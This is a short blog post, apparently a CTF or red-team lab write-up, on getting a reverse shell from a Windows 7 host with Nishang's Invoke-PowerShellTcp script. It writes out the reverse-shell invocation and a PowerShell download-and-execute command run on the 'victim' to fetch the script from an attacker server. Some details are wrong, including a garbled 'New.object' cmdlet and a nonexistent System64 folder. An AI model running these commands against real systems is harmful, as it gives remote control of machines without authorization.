---
layout: post
title:  "Getting Windows 7 Reverse Shell Using Nishang"
date:   2019-02-23 08:12:24 +0530
categories: redteam ctf
---

Nishang has a collection of scripts which used in offensive security. In this post I'm using the sctipt "Invoke-PowerShellTcp.ps1" to 
get the reverse shell. 

## Background

I have found a windows machine which has command execution vulnerability. I was able to ping from the windows host to my host. The next step
is getting the reverse shell. For this task I'm using Nishang.

Download the script;

![Here is the link to the script](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

copy below line to the end of the file,

```
PS > Invoke-PowerShellTcp -Reverse -IPAddress <Attacker-IP> -Port 4444
```
![Copy below line](https://raw.githubusercontent.com/janithmalinga/janithmalinga.github.io/master/_images/_fli-smtp-shell/windows-nishang-01.png)

Use this command to check powershell directory we use is correct or not,
```
c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe ping 10.10.14.3
```

Capture the traffic using tcpdump to check the victim is pinging or not.

### Windows default binary paths are,

windows 32 bit
```
c:\Windows\System32
c:\Windows\System64
```
Windows 64 bit
```
c:\Windows\SysNative
```

## Final part

Everything is set, Now we are going to run powershell on victim host to download our nishang script and run it,

now run simpleHTTPServer on above script file located path,
![Running simple http server](https://raw.githubusercontent.com/janithmalinga/janithmalinga.github.io/master/_images/_fli-smtp-shell/windows-nishang-02.png)

run below command on victim,
```
c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New.object Net.webClient).downloadString('http://10.10.14.3/Invoke-PowerShellTcp.ps1')
```

Using a nc listner we can catch the reverse shell.
